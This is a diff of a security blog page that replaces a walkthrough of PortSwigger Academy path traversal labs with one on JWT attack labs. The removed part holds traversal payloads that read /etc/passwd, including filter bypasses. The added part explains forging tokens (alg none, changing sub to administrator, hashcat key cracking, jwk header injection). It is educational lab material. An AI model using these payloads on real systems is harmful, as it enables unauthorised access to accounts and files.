@@ -26,7 +26,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Path Traversal - Web Sec academy labs</title>
+    <title>JWT - Web Sec academy labs</title>
     <style>
       :root {
         --text-color: #333;
@@ -258,38 +258,79 @@
 
     <div class="post-container">
       <article class="post">
-        <h1 class="post-title">Path Traversal - Web Sec academy labs</h1>
-        <p class="post-meta">Posted on February 1, 2025</p>
+        <h1 class="post-title">JWT - Web Sec academy labs</h1>
+        <p class="post-meta">Posted on July 8, 2025</p>
         
         <div class="post-content">
-          <p>This post will run through the labs on web sec academy by Portswigger related to Path traversal.</p>
+          <p>This post will run through the labs on web sec academy by Portswigger related to JWT attacks.</p>
 
-<h3 id="lab-file-path-traversal-simple-case"><u>Lab: File path traversal, simple case</u></h3>
-<p>We are asked to retrieve the contents of the “/etc/passwd” file. We can see the image is loaded through it’s filename so by changing this parameter and navigating through the file system using “../” we can get the contents by send a request on burp to:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a05003804955ada8062ef4d009200a1.web-security-academy.net/image?filename=/../../../etc/passwd
-</code></pre></div></div>
+<p>JWT stands for json web token and is made up of three parts: header, payload and signature.</p>
 
-<h3 id="lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"><u>Lab: File path traversal, traversal sequences blocked with absolute path bypass</u></h3>
-<p>This time the path traversal is blocked however by supplying the absolute path of the file we can still reach it using the following url:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a98002b0476693a8032ad880041000a.web-security-academy.net/image?filename=/etc/passwd
+<h3 id="lab-jwt-authentication-bypass-via-unverified-signature"><u>Lab: JWT authentication bypass via unverified signature</u></h3>
+<p>Sometimes developers use decode() instead of verify() when checking JWTs so by putting any signature we can bypass authentication. In this lab when we try access /admin we are told “Admin interface only available if logged in as an administrator”. We also see in our GET request to /admin we include a session cookie which is a JWT which when decoded shows:<br />
+HEADER</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+  "kid": "17db250c-22cc-404a-a400-a9b1aa40bd7f",
+  "alg": "RS256"
+}
 </code></pre></div></div>
+<p>PAYLOAD</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+  "iss": "portswigger",
+  "exp": 1751985136,
+  "sub": "wiener"
+}
+</code></pre></div></div>
+<p>Now all we have to do is create our own JWT with the “sub” field changed to adminstrator and then send the request using that token.</p>
 
-<h3 id="lab-file-path-traversal-traversal-sequences-stripped-non-recursively"><u>Lab: File path traversal, traversal sequences stripped non-recursively</u></h3>
-<p>In this lab the application strips path traversal sequences from the user-supplied filename before using it. However we can bypass using nested traversal sequences “….//”.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a0a00d2031e790381f82a24009b0099.web-security-academy.net/image?filename=....//....//....//etc/passwd
+<h3 id="lab-jwt-authentication-bypass-via-flawed-signature-verification"><u>Lab: JWT authentication bypass via flawed signature verification</u></h3>
+<p>As you saw in the last lab te header includes the hashing algorithm being used however it can also be set to none so it would have no signature. These tokens are usually rejected through filtering however if the filtering is bypassed you can get them accepted. In this lab it isn’t filtered so we can just set the token to have the header:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+  "kid": "42b647a6-0275-42c1-8fe6-6609c474dc78",
+  "alg": "none"
+}
 </code></pre></div></div>
+<p>And then our payload:
+{
+  “iss”: “portswigger”,
+  “exp”: 1751987188,
+  “sub”: “administrator”
+}</p>
 
-<h3 id="lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode"><u>Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</u></h3>
-<p>We can also bypass the path traversal stripping using url encoding or even double url encoding. Thus we can bypass by double encoding this parameter:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/image?filename=../../../etc/passwd
+<h3 id="lab-jwt-authentication-bypass-via-weak-signing-key"><u>Lab: JWT authentication bypass via weak signing key</u></h3>
+<p>Secret keys in jwt tokens can also be brute forced with hashcat using a wordlist of secrets that get used alot. This can be done using the command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;
 </code></pre></div></div>
-<h3 id="lab-file-path-traversal-validation-of-start-of-path"><u>Lab: File path traversal, validation of start of path</u></h3>
-<p>Sometimes the validation will want to make sure the file is in a certain folder so we will need to start from that folder then traverse to the file we want like the following:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a62006c04c196ef814f7582004c006a.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
+<p>After running my command with the wordlist from https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list , i got my secret to be secret1. Then using the site https://10015.io/tools/jwt-encoder-decoder , i was able to encode a JWT with the secret and having my user changed to administrator.</p>
+
+<h3 id="lab-jwt-authentication-bypass-via-jwk-header-injections"><u>Lab: JWT authentication bypass via jwk header injections</u></h3>
+<p>While only the alg parameter is required for header there some other parameters interesting for attacking:</p>
+<ul>
+  <li>jwk - Embedded json representing the key</li>
+  <li>jku - URL which servers can fetch keys containing the correct key</li>
+  <li>kid - ID that servers can use to identify the correct key</li>
+</ul>
+
+<p>Sometimes servers might be misconfigured so they use the key inside the jwk parameter. This would allow us to create our own key and sign a custom JWT which is what we do in this lab. To do this we will use a burp extension called JWT editor which makes the process easier. First we will go to the JWT editor tab and create a RSA key, then we will try access /admin and send that request to burp repeater. In burp repeater there is a tab for JWT where we can press attack and select “Embedded JWK” which automatically sets up the header and payload for us. It should look like this:<br />
+HEADER</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+    "kid": "2ac478c2-b490-4243-954f-0aff5c9f1a30",
+    "typ": "JWT",
+    "alg": "RS256",
+    "jwk": {
+        "kty": "RSA",
+        "e": "AQAB",
+        "kid": "2ac478c2-b490-4243-954f-0aff5c9f1a30",
+        "n": "memsTBknau_iBAg0UMMvjNsAF7rD4sKFxgeAbntGE2kmHtN14VnFv6bBuB3jyTKC52RjMeLSxBbyIR5-a3G3hBC2-VO2vU97vPUsAd9hFgP8m8-x6tOAGtbS3UsDh213dlupatYSF6pae1SepI_Bbn3dhGgDprw2ZcMva_a9jl0uYzjoXq7OgP3E3ew1yrFrSGDR0DcMbScIq_bOhuLNVznMNRr_2xTvKHRvwR83KyW9yCCU20CyuMg_n4o6eXfisPBIpEwopE4EZWG0ZwFlFq04fPzbDHU3FsXWVFHwW8e9mWEJUi13oxWUGp-gz0h91FYi2Xq7lXgj9y_0fHI8oQ"
+    }
+}
 </code></pre></div></div>
-<h3 id="lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass"><u>Lab: File path traversal, validation of file extension with null byte bypass</u></h3>
-<p>It could also require the parameter to be a certain file type which is where we can use a the null byte (%00) then put the file extension they want.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a04003b035be698805d456400b10079.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg
+<p>PAYLOAD</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+    "iss": "portswigger",
+    "exp": 1751997186,
+    "sub": "administrator"
+}
 </code></pre></div></div>
 
         </div>
